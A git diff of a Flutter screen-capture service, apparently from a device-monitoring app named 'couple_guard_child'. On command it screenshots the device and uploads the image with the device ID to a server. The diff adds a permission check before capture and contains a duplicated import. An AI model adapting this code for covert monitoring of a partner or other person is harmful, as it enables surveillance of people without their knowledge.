@@ -1,5 +1,7 @@
 import 'dart:io';
 import 'dart:typed_data';
+import 'package:couple_guard_child/services/local/local_storage_service.dart'
+    as storage;
 import 'package:dio/dio.dart';
 import 'package:flutter/services.dart';
 import 'package:get/get.dart' hide FormData, MultipartFile;
@@ -9,12 +11,15 @@ import 'package:path_provider/path_provider.dart';
 import '../../core/constants/app_endpoints.dart';
 import '../api/api_service.dart';
 import '../local/local_storage_service.dart';
+import '../local/local_storage_service.dart' as storage;
 
 class ScreenCaptureService {
   static const String _tag = 'ScreenCaptureService';
   static final ScreenshotController _screenshotController =
       ScreenshotController();
-  static const _platform = MethodChannel('screen_capture_channel');
+
+  /// Initialize screenshot controller
+  static const _platform = MethodChannel('screen_capture_permission_channel');
 
   /// Initialize screenshot controller
   static Future<void> initialize() async {
@@ -33,26 +38,88 @@ class ScreenCaptureService {
   /// Get screenshot controller instance
   static ScreenshotController get controller => _screenshotController;
 
-  /// Capture screen and send to server
+  /// Check if permission was granted
+  static Future<bool> isSupported() async {
+    try {
+      final granted = await LocalStorageService.getScreenCapturePermission();
+      developer.log('Screen capture permission granted: $granted', name: _tag);
+      return granted;
+    } catch (e) {
+      developer.log(
+        'Error checking screen capture permission',
+        name: _tag,
+        error: e,
+      );
+      return false;
+    }
+  }
+
+  // ✅ UPDATE: Request permission and save status
+  static Future<bool> requestPermission() async {
+    developer.log('========================================', name: _tag);
+    developer.log('Requesting screen capture permission...', name: _tag);
+
+    try {
+      if (Platform.isAndroid) {
+        // ✅ Call native method to launch permission activity
+        final bool? result = await _platform.invokeMethod(
+          'requestScreenCapturePermission',
+        );
+
+        if (result == true) {
+          // Save to local storage
+          await LocalStorageService.setScreenCapturePermission(true);
+          developer.log('✅ Screen capture permission GRANTED', name: _tag);
+          developer.log('========================================', name: _tag);
+          return true;
+        } else {
+          developer.log('❌ Screen capture permission DENIED', name: _tag);
+          developer.log('========================================', name: _tag);
+          return false;
+        }
+      } else {
+        // iOS - no permission needed for screenshot package
+        await LocalStorageService.setScreenCapturePermission(true);
+        developer.log('✅ Screen capture permission granted (iOS)', name: _tag);
+        developer.log('========================================', name: _tag);
+        return true;
+      }
+    } catch (e) {
+      developer.log(
+        '❌ Error requesting screen capture permission',
+        name: _tag,
+        error: e,
+      );
+      developer.log('========================================', name: _tag);
+      return false;
+    }
+  }
+
+  // ✅ ADD: Clear permission (for testing/reset)
+  static Future<void> clearPermission() async {
+    try {
+      await LocalStorageService.setScreenCapturePermission(false);
+      developer.log('Screen capture permission cleared', name: _tag);
+    } catch (e) {
+      developer.log('Error clearing permission', name: _tag, error: e);
+    }
+  }
+
   static Future<void> captureAndSend() async {
     developer.log('========================================', name: _tag);
     developer.log('🖥️ SCREEN CAPTURE COMMAND', name: _tag);
 
-    try {
-      developer.log('Requesting native screenshot...', name: _tag);
-
-      // Call native method
-      await _platform.invokeMethod('captureScreen');
-
-      developer.log('✅ Native screenshot requested', name: _tag);
-    } catch (e) {
-      developer.log('Failed to capture via native', name: _tag, error: e);
+    // Check permission first
+    final hasPermission = await isSupported();
+    if (!hasPermission) {
+      developer.log('❌ No screen capture permission', name: _tag, level: 900);
+      developer.log('========================================', name: _tag);
+      return;
     }
 
     try {
       developer.log('Capturing screen...', name: _tag);
 
-      // Capture screen as Uint8List
       final Uint8List? imageBytes = await _screenshotController.capture(
         pixelRatio: 1.0,
       );
@@ -68,7 +135,6 @@ class ScreenCaptureService {
         name: _tag,
       );
 
-      // Save to temporary file
       final Directory tempDir = await getTemporaryDirectory();
       final String timestamp = DateTime.now().millisecondsSinceEpoch.toString();
       final String filePath = '${tempDir.path}/screenshot_$timestamp.png';
@@ -78,7 +144,6 @@ class ScreenCaptureService {
 
       developer.log('Screenshot saved to: $filePath', name: _tag);
 
-      // Send to server
       await _sendToServer(imageFile);
     } catch (e, stackTrace) {
       developer.log(
@@ -244,18 +309,15 @@ class ScreenCaptureService {
     }
   }
 
-  /// Send screenshot to server
   static Future<void> _sendToServer(File imageFile) async {
     try {
       developer.log('Preparing to send screenshot to server...', name: _tag);
 
-      // Verify file exists before proceeding
       if (!await imageFile.exists()) {
         developer.log('❌ Image file does not exist', name: _tag);
         return;
       }
 
-      // Get device ID
       final deviceId = await LocalStorageService.getDeviceId();
       if (deviceId == null || deviceId.isEmpty) {
         developer.log('❌ No device ID found', name: _tag);
@@ -264,11 +326,9 @@ class ScreenCaptureService {
 
       developer.log('Device ID: ${deviceId.substring(0, 8)}...', name: _tag);
 
-      // Get API service
       final apiService = ApiService();
       await apiService.init();
 
-      // Create form data
       developer.log('Creating form data...', name: _tag);
       final int fileSize = await imageFile.length();
       developer.log(
@@ -289,7 +349,6 @@ class ScreenCaptureService {
         name: _tag,
       );
 
-      // Send to server with timeout
       final response = await apiService.dio.post(
         ApiEndpoints.sendScreenshot,
         data: formData,
@@ -305,7 +364,6 @@ class ScreenCaptureService {
       if (response.statusCode == 200 || response.statusCode == 201) {
         developer.log('✅ Screenshot uploaded successfully', name: _tag);
 
-        // Delete local file after successful upload
         try {
           if (await imageFile.exists()) {
             await imageFile.delete();
@@ -356,16 +414,5 @@ class ScreenCaptureService {
     } catch (e) {
       developer.log('Failed to send bytes to server', name: _tag, error: e);
     }
-  }
-
-  /// Check if screenshot is supported (always true for this package)
-  static Future<bool> isSupported() async {
-    return true;
-  }
-
-  /// No permission needed for screenshot package
-  static Future<bool> requestPermission() async {
-    developer.log('Screenshot package does not require permission', name: _tag);
-    return true;
   }
 }
